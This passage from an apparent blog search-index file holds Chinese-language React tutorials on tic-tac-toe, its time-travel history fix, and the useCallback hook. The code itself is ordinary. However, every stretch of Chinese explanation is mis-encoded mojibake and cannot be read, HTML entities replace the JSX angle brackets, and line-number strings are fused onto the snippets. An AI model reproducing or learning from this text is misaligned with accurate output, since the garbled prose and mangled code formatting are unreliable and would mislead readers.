? \"X\" : \"O\"; setHistory([...history, { squares: newSquares }]); setXIsNext(!xIsNext); setStepNumber(history.length);}; é€™é‚Šçš„å•é¡Œæœ‰å…©å€‹ï¼š æ²’æœ‰æ ¹æ“šç›®å‰åœ¨ç¬¬å¹¾æ­¥ä¾†æ¸…é™¤ä¸è¦çš„æ­·å²ç´€éŒ„ï¼Œè€Œæ˜¯ä¸€ç›´æ²¿ç”¨ä¸Šä¸€æ¬¡çš„æ­·å²ç´€éŒ„ ä¾†è‡ªç¬¬ä¸€å€‹å•é¡Œï¼Œå› ç‚ºæ²’æœ‰æ¸…æ‰ç´€éŒ„ï¼Œæ‰€ä»¥ stepNumber çš„å€¼ä¹Ÿæœƒæ˜¯éŒ¯çš„ é€™æ¨£è¬›å¯èƒ½æœ‰é»æŠ½è±¡ï¼Œæ‰€ä»¥æˆ‘èˆ‰å€‹ä¾‹å­å§ã€‚ å‡è¨­æˆ‘ä¸‹äº†å…­æ­¥æ£‹ï¼Œæ¥è‘—æˆ‘è·³å›ç¬¬ä¸€æ­¥ï¼Œå†ä¸‹ç¬¬äºŒæ­¥æ£‹ï¼Œé‚£æ ¹æ“šä¸Šé¢çš„ code æœƒé€™æ¨£åŸ·è¡Œï¼š 1234567891011121314151617const handleUpdateSquares = (i) =&gt; { // å…ˆå–å‡ºä¸Šæ¬¡çš„æœ€å¾Œä¸€ç­†æ­·å²ç´€éŒ„ï¼ˆä¹Ÿå°±æ˜¯ç¬¬å…­æ­¥çš„ç´€éŒ„ï¼‰ const latest = history[history.length - 1]; // åˆ¤æ–·æ˜¯ä¸æ˜¯å·²ç¶“åˆ†å‡ºå‹è²  &amp;&amp; æ ¼å­æ˜¯ä¸æ˜¯è¢«ä¸‹éäº†ï¼Œ // æœ‰çš„è©±å°±ä¸å†å¾€ä¸‹åŸ·è¡Œ if (calculateWinner(latest.squares) || latest.squares[i]) return; // è¤‡è£½ä¸€ä»½ä¸Šæ¬¡çš„æ£‹ç›¤ç‹€æ…‹ï¼ˆä¹Ÿå°±æ˜¯ç¬¬å…­æ­¥çš„ç´€éŒ„ï¼‰ const newSquares = latest.squares.slice(); // æŠŠè¦æ”¹çš„åœ°æ–¹æ›´æ–°ç‚º O æˆ– X newSquares[i] = xIsNext ? \"X\" : \"O\"; // copy åŸæœ¬çš„ historyï¼Œä¸¦æ’å…¥å‰›å‰›æ–°ç”¢ç”Ÿçš„æ£‹ç›¤ç‹€æ…‹ï¼ˆé€™é‚Šç­‰æ–¼æ˜¯ç”¢ç”Ÿç¬¬ä¸ƒç­†çš„ç´€éŒ„ï¼‰ setHistory([...history, { squares: newSquares }]); // æ›´æ–° player setXIsNext(!xIsNext); // æŠŠæ­¥é©Ÿæ•¸æ›´æ–°ç‚ºæ–°çš„ history çš„é•·åº¦ï¼ˆç¬¬ä¸ƒæ­¥ï¼‰ setStepNumber(history.length);}; æ³¨æ„åˆ°å•é¡Œäº†å—ï¼Ÿæˆ‘å€‘åŸæœ¬é æœŸçš„çµæœæ‡‰è©²è¦æ˜¯ã€ŒæŠŠç¬¬ä¸€æ­¥ä»¥å¾Œçš„æ­·å²ç´€éŒ„éƒ½æ¸…æ‰ï¼Œä¸¦æŠŠæ­¥é©Ÿæ•¸è¨­ç‚ºç¬¬äºŒæ­¥ã€ï¼Œå‡ºä¾†çš„çµæœå»æ˜¯æ­·å²ç´€éŒ„ä¾ç„¶éå¢æˆä¸ƒç­†ï¼Œè€Œä¸”æ­¥é©Ÿæ•¸ä¹Ÿéå¢ç‚ºä¸ƒã€‚ æ‰€ä»¥é€™æ™‚å€™å°±æœƒç”¢ç”Ÿé€™ç¨®å¾ˆè©­ç•°çš„çµæœï¼š ç°¡å–®ä¾†èªªå°±æ˜¯ç•«é¢è·Ÿ state ä¸åŒæ­¥çš„å•é¡Œã€‚é›–ç„¶ç•«é¢ä¸Šçš„æ£‹ç›¤çœ‹èµ·ä¾†æ˜¯ç©ºçš„ï¼Œä½†åœ¨ state è£¡é¢å®ƒå·²ç¶“è¢«é»éäº†ï¼Œæ‰€ä»¥æ‰æœƒæ€éº¼é»éƒ½æ²’ç”¨ï¼Œåªæœ‰åœ¨æˆ‘é»äº† state è£¡æ²’è¢«ä¸‹éçš„åœ°æ–¹æ‰å¯ä»¥ï¼ˆæœ€å¾Œçš„å³ä¸‹è§’ï¼‰ã€‚ æ‰€ä»¥ä¾†ä¿®æ­£ä¸€ä¸‹é€™å€‹ bug å§ï¼š 123456789101112131415161718const handleUpdateSquares = (i) =&gt; { // æ ¹æ“šç›®å‰çš„æ­¥é©Ÿæ•¸ï¼Œå–å‡ºä¸Šä¸€æ¬¡çš„æ­·å²ç´€éŒ„ const latest = history[stepNumber]; // å·²ç¶“æœ‰è´å®¶ or å·²ç¶“é»é if (calculateWinner(latest.squares) || latest.squares[i]) return; // è¤‡è£½åŸæœ¬çš„æ£‹ç›¤ç‹€æ…‹ const newSquares = latest.squares.slice(); // æŠŠæ”¹è®Šçš„åœ°æ–¹æ›´æ–°å€¼ newSquares[i] = xIsNext ? \"X\" : \"O\"; // æ ¹æ“šç›®å‰çš„æ­¥é©Ÿæ•¸ï¼Œä¿ç•™çœŸæ­£éœ€è¦çš„æ­·å²ç´€éŒ„ const newHistory = history.slice(0, stepNumber + 1); // æ›´æ–° history setHistory([...newHistory, { squares: newSquares }]); // æ›´æ–° player setXIsNext(!xIsNext); // æ›´æ–°æ”¹å®Œç´€éŒ„ä»¥å¾Œçš„æ­¥é©Ÿæ•¸ setStepNumber(newHistory.length);}; åšåˆ°é€™é‚Šï¼Œæ­å–œä½ çœŸçš„å®Œæˆæ™‚å…‰æ—…è¡Œçš„åŠŸèƒ½äº†ã€‚ é€™å€‹åœˆåœˆå‰å‰å°±åˆ°é€™é‚ŠçµæŸäº†ï¼Œå¦‚æœä»¥ä¸Šä½ éƒ½æœ‰å¼„æ‡‚çš„è©±å°±å¤ªå¥½å›‰ï¼ æœ€å¾Œä¸€æ¨£é™„ä¸ŠåŸå§‹ç¢¼ï¼Œæœ‰èˆˆè¶£éƒ½æ­¡è¿åƒè€ƒçœ‹çœ‹ã€‚","link":"/2022/04/16/react-tic-tac-toe-add-time-machine/"},{"title":"æƒ³ç”¨ React åšå‡ºäº”å­æ£‹å—ï¼Ÿå…ˆå¾åœˆåœˆå‰å‰é–‹å§‹å§","text":"ä¸€æ­¥ä¸€æ­¥ä¾†å§ï¼ ç°¡è¿°åœ¨åšå‡ºäº”å­æ£‹ä»¥å‰ï¼Œå¯ä»¥å…ˆå¾æ¯”è¼ƒç°¡å–®çš„åœˆåœˆå‰å‰é–‹å§‹ï¼Œæ‰€ä»¥é€™ä¸€ç¯‡æ˜¯åƒè€ƒ React å®˜æ–¹æ•™å­¸ åšçš„ç­†è¨˜ï¼Œä¸ç„¶å®˜æ–¹çš„æ•˜è¿°å¯¦åœ¨çœ‹å¾—æˆ‘é ­å¾ˆç—›rrrrã€‚ åˆ†æçµæ§‹ç¬¬ä¸€æ­¥å…ˆå¾çµæ§‹åˆ†æé–‹å§‹ï¼Œå‡è¨­æˆ‘å€‘æœ‰ä»¥ä¸‹ Componentï¼š Game æ•´å€‹éŠæˆ² Board æ£‹ç›¤ Square æ¯å€‹æ ¼å­ é‚£çµæ§‹å¤§æ¦‚å°±æœƒé•·é€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829303132function Square() { return ( &lt;button&gt;æ ¼å­&lt;/button&gt; );}function Board() { return ( &lt;div&gt; &lt;div className=\"board-row\"&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;/div&gt; &lt;div className=\"board-row\"&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;/div&gt; &lt;div className=\"board-row\"&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;Square /&gt; &lt;/div&gt; &lt;/div&gt; );}export default function Game() { return &lt;Board /&gt;;} é€™é‚Šç‚ºäº†å¯è®€æ€§å…ˆæŠŠ props éƒ½æ‹¿æ‰äº†ï¼Œå¾Œé¢æœƒåœ¨ä¸€æ­¥ä¸€æ­¥è§£é‡‹ã€‚ è¦åŠƒ stateåœ¨åœˆåœˆå‰å‰é€™éŠæˆ²è£¡é¢æœƒéœ€è¦ï¼š æ£‹ç›¤çš„ state è¼ªåˆ°èª°ä¸‹æ£‹çš„ state æ‰€ä»¥æœƒé€™æ¨£å­åšï¼š 1234function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true);} å› ç‚ºæ˜¯ä¹å®®æ ¼ï¼Œæ‰€ä»¥æœƒç”¨é€™æ¨£çš„é™£åˆ—ä¾†å­˜ï¼š 12345const squares = [ null, null, null, null, null, null, null, null, null,] æ¯ç•¶æˆ‘å€‘æƒ³æ”¹è®Šæ£‹ç›¤çš„æ™‚å€™ï¼Œå°±æœƒåƒé€™æ¨£ï¼š 123456// ç¬¬ä¸€è¼ªconst squares = [ \"O\", null, null, null, null, null, null, null, null,] æ¥è‘—ï¼š 123456// ç¬¬äºŒè¼ªconst squares = [ \"O\", null, null, null, \"X\", null, null, null, null,] æ¸²æŸ“å‡º Squareåœ¨æœ‰äº†é€™äº›åŸºæœ¬è¦åŠƒå¾Œï¼Œæˆ‘å€‘å…ˆä¾†è™•ç†ç•«é¢çš„å•é¡Œã€‚ é¦–å…ˆè¦æŠŠ squares ç•¶ä½œ props çµ¦ &lt;Square /&gt; ç”¨ï¼Œè®“å®ƒæ ¹æ“š state ä¾†é¡¯ç¤ºç›®å‰æ£‹ç›¤çš„æ¨£å­ã€‚ æ‰€ä»¥ &lt;Square /&gt; çš„éƒ¨åˆ†æœƒå¯«æˆé€™æ¨£ï¼š 123456// æ¥æ”¶ propsfunction Square({ value }) { return ( &lt;button className=\"square\"&gt;{value}&lt;/button&gt; );} è€Œ &lt;Board /&gt; çš„éƒ¨åˆ†å‰‡æ˜¯ï¼š 123456789101112131415161718192021222324252627282930function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // æ‹¿ä¾†æ¸²æŸ“ Square çš„å‡½å¼ const renderSquare = (i) =&gt; { return &lt;Square value={squares[i]} /&gt;; }; return ( &lt;div&gt; &lt;div className=\"status\"&gt;{status}&lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(0)} {renderSquare(1)} {renderSquare(2)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(3)} {renderSquare(4)} {renderSquare(5)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(6)} {renderSquare(7)} {renderSquare(8)} &lt;/div&gt; &lt;/div&gt; );} é€™é‚Šå¯«æˆ renderSquare æ˜¯ç‚ºäº†è®“ code æ¯”è¼ƒç°¡æ½”ï¼Œä¸ç„¶åŸæœ¬å¾—é€™æ¨£å¯«ï¼š 1234567891011121314151617181920return ( &lt;div&gt; &lt;div className=\"status\"&gt;{status}&lt;/div&gt; &lt;div className=\"board-row\"&gt; {&lt;Square value={squares[0]} /&gt;} {&lt;Square value={squares[1]} /&gt;} {&lt;Square value={squares[2]} /&gt;} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {&lt;Square value={squares[3]} /&gt;} {&lt;Square value={squares[4]} /&gt;} {&lt;Square value={squares[5]} /&gt;} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {&lt;Square value={squares[6]} /&gt;} {&lt;Square value={squares[7]} /&gt;} {&lt;Square value={squares[8]} /&gt;} &lt;/div&gt; &lt;/div&gt;); åšåˆ°é€™ä¸€æ­¥ä»¥å¾Œï¼Œå°±èƒ½ç¢ºä¿ &lt;Square /&gt; æœƒæ ¹æ“š props ä¾†é¡¯ç¤ºå€¼ï¼Œå¯ä»¥è©¦è‘—å…ˆæŠŠ useState çš„åˆå§‹å€¼è¨­ç‚º \"A\"ï¼Œå°±æœƒçœ‹åˆ°é€™å€‹çµæœï¼š é€™é‚Šæ²’å•é¡Œçš„è©±å°±å¯ä»¥é€²åˆ°ä¸‹å€‹æ­¥é©Ÿäº†ã€‚ æ›´æ–°æ£‹ç›¤çš„ Stateæ¥è‘—ï¼Œæˆ‘å€‘å¸Œæœ›ç•¶ &lt;Square /&gt; çš„æŒ‰éˆ• click æ™‚å»ä¿®æ”¹æ£‹ç›¤çš„ stateï¼Œè®“å®ƒé¡¯ç¤º O æˆ– Xï¼Œä¹Ÿå°±æ˜¯èªª state å¿…é ˆè®Šæˆé€™æ¨£ï¼š 12345const newSquares = [ null, null, null, null, null, null, null, null, \"O\",] ä¸éæˆ‘å€‘éƒ½çŸ¥é“å­å±¤æ²’è¾¦æ³•ç›´æ¥å»æ”¹æ”¾åœ¨çˆ¶å±¤çš„ stateï¼Œå› æ­¤é€™é‚Šä¸€æ¨£è¦é€é props ä¾†å‚³å…¥ä¿®æ”¹ state çš„ function é€²å»ã€‚ é€™é‚Šå…ˆåœ¨ &lt;Board /&gt; å¯«å¥½ç”¨ä¾†è®Šæ›´ state çš„ functionï¼š 12345678910111213141516function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // é æœŸæœƒå‚³å…¥ä¸€å€‹ i ä¾†å‘ŠçŸ¥æˆ‘å€‘è¦æ›´æ–°å“ªä¸€ç­†å€¼ const handleChangeSquaresState = (i) =&gt; { // è¤‡è£½ä¸€ä»½åŸæœ¬çš„ const newSquares = squares.slice(); // æŠŠè¦æ›´æ–°çš„åœ°æ–¹è³¦å€¼ newSquares[i] = \"O\"; // å‚³çµ¦ setter setSquares(newSquares); }; // ...} å¦‚æœä½ åå¥½ map çš„è©±ä¹Ÿå¯ä»¥é€™æ¨£å¯«ï¼š 123456789101112131415function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); const handleChangeSquaresState = (i) =&gt; { setSquares( squares.map((item, index) =&gt; { if (i === index) return \"O\"; return item; }) ); }; // ...} æ¥è‘—å°±å¯ä»¥æŠŠå¯«å¥½çš„æ±è¥¿å‚³çµ¦ &lt;Square /&gt; äº†ï¼š 12345678910111213141516171819202122function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); const handleChangeSquaresState = (i) =&gt; { const newSquares = squares.slice(); newSquares[i] = \"O\"; setSquares(newSquares); }; const renderSquare = (i) =&gt; { return ( &lt;Square value={squares[i]} // å‚³é€²å» handleChangeSquaresState={() =&gt; handleChangeSquaresState(i)} /&gt; ); }; // ...} é€™é‚Šæ˜¯è®“æˆ‘å¡æ¯”è¼ƒä¹…çš„åœ°æ–¹ï¼Œå› ç‚ºæœ‰ç”¨åˆ°ã€ŒClousreã€çš„æ¦‚å¿µï¼Œæ‰€ä»¥é€™é‚Šå¤šåšå€‹è§£é‡‹ã€‚ é¦–å…ˆï¼Œæˆ‘å€‘åœ¨æ¸²æŸ“ &lt;Square /&gt; æ™‚æ˜¯é€™æ¨£åšçš„ï¼š 1234567891011return ( {renderSquare(0)} {renderSquare(1)} {renderSquare(2)} {renderSquare(3)} {renderSquare(4)} {renderSquare(5)} {renderSquare(6)} {renderSquare(7)} {renderSquare(8)}); æ‰€ä»¥ç¶“é renderSquare è™•ç†å¾Œå°±ç­‰æ–¼ï¼š 12345678910111213&lt;Square value={squares[0]} // å‚³é€²å» handleChangeSquaresState={() =&gt; handleChangeSquaresState(0)}/&gt;&lt;Square value={squares[1]} // å‚³é€²å» handleChangeSquaresState={() =&gt; handleChangeSquaresState(1)}/&gt;... æ„æ€èªªæˆ‘å€‘åœ¨çˆ¶å±¤å°±å…ˆé€é Closure æŠŠ i çš„å€¼çµ¦å‚³å…¥äº†ï¼Œå› æ­¤ &lt;Square /&gt; æ‰èƒ½ç›´æ¥æ¥å—é€™å€‹ propsï¼Œä¸¦ç•¶æˆ Even handlerï¼š 1234567891011121314function Square({ value, handleChangeSquaresState }) { return ( &lt;button className=\"square\" // é€™é‚Š onClick çš„å€¼å°±ç­‰æ–¼ï¼š // () =&gt; handleChangeSquaresState(1) // () =&gt; handleChangeSquaresState(2) // ä»¥æ­¤é¡æ¨ onClick={handleChangeSquaresState} &gt; {value} &lt;/button&gt; );} é€™å°±æ˜¯ç‚ºä»€éº¼å°±ç®— &lt;Square /&gt; ä¸å‚³ä»»ä½•åƒæ•¸çˆ¶å±¤ä¹ŸçŸ¥é“è¦å»æ”¹é™£åˆ—çš„å“ªä¸€å€‹å€¼ã€‚ï¼ˆé€™å€‹å¾ˆé‡è¦ï¼Œä¸æ‡‚çš„è©±å°±å¤šæƒ³æƒ³çœ‹ï¼‰ åšåˆ°ç›®å‰é€™è£¡ï¼Œæ‡‰è©²æœƒæœ‰é€™æ¨£çš„çµæœï¼š æ ¹æ“š state é¡¯ç¤º O æˆ– Xæ¥è‘—è¦è™•ç† O è·Ÿ X è¼ªæµé¡¯ç¤ºçš„å•é¡Œï¼Œæ‰€ä»¥æœƒç”¨åˆ°ä¸€é–‹å§‹æçš„å¦ä¸€å€‹ stateï¼ŒxIsNextã€‚ é€™é‚Šå‡è¨­ç”± X å…ˆä¸‹æ£‹ï¼Œæ‰€ä»¥åˆå§‹å€¼è¨­ç‚º trueï¼š 1const [xIsNext, setXIsNext] = useState(true); æ¥è‘—èª¿æ•´ä¸€ä¸‹ handleChangeSquaresStateï¼Œè®“ä»–æ ¹æ“šç›®å‰ xIsNext ä¾†æ±ºå®šè³‡æ–™è¦é•·æ€æ¨£ï¼š 12345678const handleChangeSquaresState = (i) =&gt; { const newSquares = squares.slice(); // æ ¹æ“š state åšåˆ¤æ–· newSquares[i] = xIsNext ? \"X\" : \"O\"; setSquares(newSquares); // æœ€å¾Œåˆ¥å¿˜äº†æŠŠå€¼æ›´æ–° setXIsNext(!xIsNext);}; åšåˆ°é€™é‚Šå°±å¯ä»¥æ­£ç¢ºé¡¯ç¤º O æˆ– X äº†ï¼Œä¸éè¦æ³¨æ„ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯é‡è¤‡é»æ“Šï¼š æ‰€ä»¥é€™éƒ¨åˆ†å¾—è¦å¤šåšä¸€å±¤è™•ç†ï¼š 12345678const handleChangeSquaresState = (i) =&gt; { // å·²ç¶“æœ‰å€¼çš„è©±å°±ä¸å¾€ä¸‹åŸ·è¡Œ if (squares[i]) return; const newSquares = squares.slice(); newSquares[i] = xIsNext ? \"X\" : \"O\"; setSquares(newSquares); setXIsNext(!xIsNext);}; é€™æ¨£å°±è§£æ±ºå‰›å‰›çš„ bug äº†ã€‚ é¡¯ç¤ºç›®å‰çš„ playeræ¥è‘—ä¾†åŠ ä¸Šä¸€æ®µé¡¯ç¤ºç›®å‰ player çš„è¨Šæ¯ï¼Œåœ¨ &lt;Board /&gt; è£¡é¢åŠ ä¸Šé€™æ®µï¼š 123456789101112131415161718192021222324252627282930function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // æ ¹æ“š state é¡¯ç¤ºä¸åŒè¨Šæ¯ const status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; // ... return ( &lt;div&gt; // åŠ ä¸Š DOM å…ƒç´  &lt;div className=\"status\"&gt;{status}&lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(0)} {renderSquare(1)} {renderSquare(2)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(3)} {renderSquare(4)} {renderSquare(5)} &lt;/div&gt; &lt;div className=\"board-row\"&gt; {renderSquare(6)} {renderSquare(7)} {renderSquare(8)} &lt;/div&gt; &lt;/div&gt; );} åšåˆ°é€™é‚Šå¾Œæœƒé•·é€™æ¨£ï¼š åˆ¤æ–·è¼¸è´æ¥ä¸‹ä¾†æ˜¯æœ€å¾Œä¸€æ­¥ï¼Œåˆ¤æ–·èª°è¼¸èª°è´ã€‚é€™é‚Šè¦æ³¨æ„ä¸€ä¸‹åˆ¤æ–·çš„æ™‚æ©Ÿé»è©²æ”¾åœ¨å“ªè£¡ï¼Ÿ å…¶å¯¦æœƒæœ‰å…©å€‹åœ°æ–¹ï¼š ç¬¬ä¸€å€‹æ˜¯ state æ›´æ–°å®Œç•¢æ™‚ï¼Œç•«é¢è¦æ ¹æ“š state é¡¯ç¤ºè´å®¶ ç¬¬äºŒå€‹æ˜¯åœ¨æ”¹è®Š state ä»¥å‰ï¼Œè¦å…ˆåˆ¤æ–·æ˜¯ä¸æ˜¯å·²ç¶“æœ‰è´å®¶äº†ï¼Ÿ æˆ‘å€‘å…ˆä¾†åšç¬¬ä¸€å€‹éƒ¨åˆ†ï¼Œé¦–å…ˆå…ˆè™•ç†å¥½åˆ¤æ–·è¼¸è´çš„ functionï¼š 12345678910111213141516171819function calculateWinner(squares) { const lines = [ [0, 1, 2], [3, 4, 5], [6, 7, 8], [0, 3, 6], [1, 4, 7], [2, 5, 8], [0, 4, 8], [2, 4, 6] ]; for (let i = 0; i &lt; lines.length; i++) { const [a, b, c] = lines[i]; if (squares[a] &amp;&amp; squares[a] === squares[b] &amp;&amp; squares[a] === squares[c]) { return squares[a]; } } return null;} æ¥è‘—è¦åœ¨ &lt;Board /&gt; æ¯ä¸€æ¬¡ re-render å¾Œæ ¹æ“šè¨ˆç®—çµæœé¡¯ç¤ºå°æ‡‰çš„è¨Šæ¯ï¼š 123456789101112131415161718function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // æ¯ä¸€æ¬¡ re-render å°±è¼¸è´è¨ˆç®— const winner = calculateWinner(squares); // status ä¸å†æ˜¯ constï¼Œè€Œæ˜¯æ ¹æ“šåˆ¤æ–·çµæœä¾†æ±ºå®š let status; // æœ‰åˆ†å‡ºå‹è²  if (winner) { status = `Winner is ${winner}`; } else if (!winner &amp;&amp; !squares.includes(null)) { status = `draw`; // æ²’æœ‰è´å®¶ &amp;&amp; æ£‹ç›¤å·²ç¶“å¡«æ»¿äº†ï¼ˆéƒ½æœ‰å€¼ï¼‰ } else { status = `Next player is ${xIsNext ? \"X\" : \"O\"}`; } // ...} é€™é‚Šåšå®Œå¾Œï¼Œæœƒåƒé€™æ¨£ ç¢ºå¯¦èƒ½åˆ¤æ–·è¼¸è´äº†ï¼Œä¸éåŒæ™‚ä¹Ÿæ³¨æ„åˆ°æœƒæœ‰å€‹ bugï¼Œå°±æ˜¯å·²ç¶“è´äº†å»é‚„èƒ½ç¹¼çºŒä¸‹æ£‹ï¼Œæ‰€ä»¥ä¸€é–‹å§‹æ‰ç‰¹åˆ¥èªªå…¶å¯¦æœ‰å…©å€‹æ™‚æ©Ÿé»ã€‚ æ¥è‘—ä¾†è™•ç†ç¬¬äºŒå€‹åœ°æ–¹ï¼Œåœ¨æ”¹è®Š state ä»¥å‰çš„åˆ¤æ–·ã€‚ 12345678910111213141516function Board() { const [squares, setSquares] = useState(Array(9).fill(null)); const [xIsNext, setXIsNext] = useState(true); // æ”¹è®Š state ä»¥å‰ const handleChangeSquaresState = (i) =&gt; { // è¨ˆç®—è¼¸è´ const winner = calculateWinner(squares); // å·²ç¶“åˆ†å‡ºå‹è²  || å·²ç¶“æœ‰å€¼ï¼Œå°±ä¸å¾€ä¸‹åŸ·è¡Œ if (winner || squares[i]) return; const newSquares = squares.slice(); newSquares[i] = xIsNext ? \"X\" : \"O\"; setSquares(newSquares); setXIsNext(!xIsNext); };} é€™æ¨£å­å°±èƒ½åœ¨æ­£ç¢ºçš„æ™‚æ©Ÿé»åœæ­¢éŠæˆ²äº†ã€‚ åšåˆ°é€™é‚Šï¼Œé€™å€‹éŠæˆ²å°±å·²ç¶“å®Œæˆå›‰ï¼Œæ­å–œæ­å–œï¼ æœ€å¾Œé™„ä¸Šå®Œæ•´çš„åŸå§‹ç¢¼ï¼šCodesandbox","link":"/2022/04/15/react-tic-tac-toe-basic/"},{"title":"React çš„ç¬¬å…­å€‹ hookï¼šuseCallback","text":"ä¹Ÿæ˜¯è·Ÿæ•ˆèƒ½æœ‰é—œã€‚ ç°¡è¿° æŠŠ function çµ¦è¨˜èµ·ä¾†ï¼Œå¦‚æœ dependencies æ²’æœ‰è®Šï¼Œå°±ä¸æœƒé‡æ–°å®£å‘Šæ–°çš„ functionã€‚ useCallback èªªç™½è©±ä¸€é»å°±æ˜¯ä¸Šé¢é‚£æ¨£å­ï¼Œå®ƒè·Ÿ useEffect æœ‰é»åƒï¼Œå¯ä»¥åœ¨ç¬¬äºŒå€‹åƒæ•¸å‚³å…¥ dependenciesï¼Œå‘Šè¨´ react åªæœ‰åœ¨ dependencies è®Šçš„æ™‚å€™æ‰å¹«æˆ‘å®£å‘Šæ–°çš„ functionï¼Œä¸ç„¶å°±æ²¿ç”¨åŸæœ¬çš„å°±å¥½ã€‚ æ¥ä¸‹ä¾†çš„ç¯„ä¾‹æœƒç¨å¾®è¤‡é›œä¸€é»ï¼Œæ‰€ä»¥å…ˆåšæ®µè§£èªªï¼š å®£å‘Šå…©å€‹ functionï¼Œä¸€å€‹æœƒç”¨ useCallback ä¸€å€‹ä¸æœƒã€‚ åˆ©ç”¨ ref ä¾†æŠŠä¸€é–‹å§‹çš„ function çµ¦è¨˜ä½ æ¯æ¬¡ re-render æ™‚å°±è·Ÿä¸€é–‹å§‹çš„ function åšæ¯”å° å¦å¤–é€™é‚Šä¸€æ¨£æœ‰ç”¨åˆ° memoï¼Œæ‰€ä»¥è¦è¨˜å¾— memo çš„ç‰¹æ€§æ˜¯ã€Œç•¶ props æ”¹è®Šæ™‚æ‰æœƒ re-renderã€ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// ç”¨ä¾†æª¢æŸ¥æ˜¯å¦ç›¸ç­‰çš„ functionconst checkIsEqual = (a, b) =&gt; a === b ? \"ç›¸ç­‰\" : \"ä¸ç›¸ç­‰\";// ç”¨ memo è¨˜èµ·ä¾†çš„ Componentconst Component = memo(props =&gt; { const counter = useRef(0); const message = props.isUseCallback ? \"æœ‰ç”¨ useCallback\" : \"æ²’æœ‰ç”¨ useCallback\"; counter.current++; return ( &lt;div&gt; {message} çš„ component å·²ç¶“è¢« render äº† {counter.current} æ¬¡ &lt;/div&gt; );});function App() { const [value, setValue] = useState(); // åªæ˜¯å€‹ç”¨ä¾†ç•¶ä½œ dependencies çš„ state const [someArg, setSomeArg] = useState(\"argument\"); // ç”¨ useCallbackï¼Œä¸¦æŠŠ dependencies è¨­ç‚º someArg const handleSomethingUseCallback = useCallback(() =&gt; {}, [someArg]); // æ²’æœ‰åšé¡å¤–è¨­å®š const handleSomething = () =&gt; {}; // ç”¨ ref æŠŠç¬¬ä¸€æ¬¡çš„å€¼è¨˜ä½ï¼Œåªè¦æˆ‘å€‘æ²’æœ‰è‡ªå·±å»æ”¹å€¼ï¼Œå®ƒå°±ä¸æœƒè®Š const refHandleSomethingUseCallback = useRef(handleSomethingUseCallback); const refHandleSomething = useRef(handleSomething); // è™•ç† input çš„ state const handleChange = (e) =&gt; setValue(e.target.value); return ( &lt;div className=\"app\"&gt; &lt;input type=\"text\" value={value} onChange={handleChange} /&gt; &lt;div&gt; æœ‰ç”¨ useCallback çš„æ¯”å°çµæœï¼š {checkIsEqual( refHandleSomethingUseCallback.current, handleSomethingUseCallback )} &lt;/div&gt; &lt;div&gt; æ²’ç”¨ useCallback çš„æ¯”å°çµæœï¼š {checkIsEqual( refHandleSomething.current, handleSomething )} &lt;/div&gt; &lt;Component isUseCallback={false} handleSomething={handleSomething} /&gt; &lt;Component isUseCallback={true} handleSomethingUseCallback={handleSomethingUseCallback} /&gt; &lt;/div&gt; );} å®ƒçš„æµç¨‹æ˜¯é€™æ¨£ï¼š è¼¸å…¥æ–‡å­—ï¼Œæ”¹è®Š value çš„ stateï¼Œè§¸ç™¼ re-render æ²’æœ‰ç”¨ useCallback çš„ function æœƒè¢«é‡æ–°å®£å‘Šï¼Œæ‰€ä»¥ Compnonent æœƒè¢« re-renderï¼ˆå› ç‚º props æ”¹è®Šï¼‰ æ¥è‘—æ‹¿ useRef å­˜çš„å€¼è·Ÿé€™æ¬¡çš„ function æ¯”å°ï¼Œå¾—åˆ° false è€Œæœ‰ç”¨ useCallback çš„ function å› ç‚º dependencies æ²’æœ‰è®Šï¼ˆsomeArgï¼‰ï¼Œæ‰€ä»¥ä¸æœƒè¢«é‡æ–°å®£å‘Šï¼Œä¹Ÿä¸æœƒ re-renderã€‚è€Œæ¯”å°çš„éƒ¨åˆ†ä¹Ÿæœƒæ˜¯ trueï¼Œå› ç‚º function çš„å€¼æ²’æœ‰æ”¹è®Šã€‚ useCallback çš„ç”¨æ³•å°±æ˜¯é€™æ¨£ï¼Œä¸éæœ€å¾Œè¦ç‰¹åˆ¥å¼·èª¿ä¸€ä»¶äº‹æƒ…ï¼š é—œæ–¼ useCallback çš„ dependenciesï¼Œä¸€å®šè¦è¨˜å¾—æŠŠ function ä¸­æœ‰ç”¨åˆ°çš„ä¾è³´è®Šæ•¸ or function æ”¾é€²å»ï¼Œä¸ç„¶æœ‰å¯èƒ½æœƒå‡ºç¾éˆç•°ç¾è±¡ï¼ˆæ²’æœ‰é‡æ–°å®£å‘Šï¼Œæ‰€ä»¥æ‹¿ä¸åˆ°æœ€æ–°çš„ stateï¼‰ å¯¦éš›æ‡‰ç”¨æ¥è‘—ç”¨ä¸€å€‹å¯¦éš›æ¡ˆä¾‹ä¾†ç¤ºç¯„ useCallback æœƒç”¨åœ¨ä»€éº¼æ¨£çš„åœ°æ–¹ã€‚ ä¸€å€‹æœ€å¸¸è¦‹çš„ä¾‹å­æ˜¯ã€Œä¸²æ¥ APIã€ï¼Œæœ€åŸºæœ¬çš„ pattern æœƒé•·é€™æ¨£ï¼š 12345useEffect(() =&gt; { fetch(...) .then(res =&gt; res.json()) 